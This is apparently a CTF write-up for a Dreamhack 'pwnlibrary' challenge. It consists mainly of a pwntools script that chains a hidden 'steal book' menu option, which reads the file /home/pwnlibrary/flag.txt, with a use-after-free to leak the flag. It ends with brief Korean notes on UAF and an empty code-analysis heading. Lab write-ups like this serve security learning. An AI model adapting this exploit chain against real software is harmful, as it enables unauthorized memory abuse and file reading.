# Payload
```python
from pwn import *

# context.log_level = 'debug'
p = remote(host = "host3.dreamhack.games", port=21401)

# borrow a book, index 1
p.recvuntil(b'[+] Select menu : ')
payload = b'1' # borrow a book
p.sendline(payload)
p.recvuntil(b'[+] what book do you want to borrow? : ')
payload = b'1' # theori theory
p.sendline(payload)

# return book, index 3
p.recvuntil(b'[+] Select menu : ')
payload = b'3'
p.sendline(payload)
p.recvuntil(b'[*] lastest book returned!')

# steal book, code 275, path : /home/pwnlibrary/flag.txt
p.recvuntil(b'[+] Select menu : ')
payload = b'275'
p.sendline(payload)
p.recvuntil(b'[+] whatever, where is the book? : ')
payload = b'/home/pwnlibrary/flag.txt'
p.sendline(payload)
p.recvuntil(b'[*] how many pages?(MAX 400) : ')
p.sendline(b'256')
p.recvuntil(b'[*] Oops.. cops take your book..')

# read book, use after free 
p.recvuntil(b'[+] Select menu : ')
payload = b'2'
p.sendline(payload)
payload = b'0'
p.sendline(payload)

p.interactive()
```
# 검색 키워드
- Use After Free
- (기능이지만) 임의 파일 읽기
# 해설
## 배경지식
- Use After Free
	- free만 해주면 해당 메모리는 재사용이 가능할 지 몰라도
	- 해당 위치를 가리키던 포인터 변수까지 null로 초기화를 해 줘야 UAF 취약점에 노출되지 않을 수 있다.
## 코드분석
- 